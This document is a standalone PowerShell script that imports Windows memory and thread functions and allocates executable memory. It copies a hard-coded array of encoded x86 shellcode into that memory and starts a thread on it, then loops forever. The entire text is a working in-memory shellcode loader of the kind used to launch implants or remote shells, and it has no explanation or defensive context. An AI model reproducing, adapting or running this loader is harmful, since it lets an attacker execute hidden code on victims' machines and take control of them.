
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xba,0xce,0xd8,0x98,0x16,0xda,0xc4,0xd9,0x74,0x24,0xf4,0x5e,0x33,0xc9,0xb1,0x47,0x31,0x56,0x13,0x83,0xee,0xfc,0x03,0x56,0xc1,0x3a,0x6d,0xea,0x35,0x38,0x8e,0x13,0xc5,0x5d,0x06,0xf6,0xf4,0x5d,0x7c,0x72,0xa6,0x6d,0xf6,0xd6,0x4a,0x05,0x5a,0xc3,0xd9,0x6b,0x73,0xe4,0x6a,0xc1,0xa5,0xcb,0x6b,0x7a,0x95,0x4a,0xef,0x81,0xca,0xac,0xce,0x49,0x1f,0xac,0x17,0xb7,0xd2,0xfc,0xc0,0xb3,0x41,0x11,0x65,0x89,0x59,0x9a,0x35,0x1f,0xda,0x7f,0x8d,0x1e,0xcb,0xd1,0x86,0x78,0xcb,0xd0,0x4b,0xf1,0x42,0xcb,0x88,0x3c,0x1c,0x60,0x7a,0xca,0x9f,0xa0,0xb3,0x33,0x33,0x8d,0x7c,0xc6,0x4d,0xc9,0xba,0x39,0x38,0x23,0xb9,0xc4,0x3b,0xf0,0xc0,0x12,0xc9,0xe3,0x62,0xd0,0x69,0xc8,0x93,0x35,0xef,0x9b,0x9f,0xf2,0x7b,0xc3,0x83,0x05,0xaf,0x7f,0xbf,0x8e,0x4e,0x50,0x36,0xd4,0x74,0x74,0x13,0x8e,0x15,0x2d,0xf9,0x61,0x29,0x2d,0xa2,0xde,0x8f,0x25,0x4e,0x0a,0xa2,0x67,0x06,0xff,0x8f,0x97,0xd6,0x97,0x98,0xe4,0xe4,0x38,0x33,0x63,0x44,0xb0,0x9d,0x74,0xab,0xeb,0x5a,0xea,0x52,0x14,0x9b,0x22,0x90,0x40,0xcb,0x5c,0x31,0xe9,0x80,0x9c,0xbe,0x3c,0x3c,0x98,0x28,0x7f,0x69,0xa3,0xc1,0x17,0x68,0xa4,0x00,0xb4,0xe5,0x42,0x72,0x14,0xa6,0xda,0x32,0xc4,0x06,0x8b,0xda,0x0e,0x89,0xf4,0xfa,0x30,0x43,0x9d,0x90,0xde,0x3a,0xf5,0x0c,0x46,0x67,0x8d,0xad,0x87,0xbd,0xeb,0xed,0x0c,0x32,0x0b,0xa3,0xe4,0x3f,0x1f,0x53,0x05,0x0a,0x7d,0xf5,0x1a,0xa0,0xe8,0xf9,0x8e,0x4f,0xbb,0xae,0x26,0x52,0x9a,0x98,0xe8,0xad,0xc9,0x93,0x21,0x38,0xb2,0xcb,0x4d,0xac,0x32,0x0b,0x18,0xa6,0x32,0x63,0xfc,0x92,0x60,0x96,0x03,0x0f,0x15,0x0b,0x96,0xb0,0x4c,0xf8,0x31,0xd9,0x72,0x27,0x75,0x46,0x8c,0x02,0x87,0xba,0x5b,0x6a,0xfd,0xd2,0x5f;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

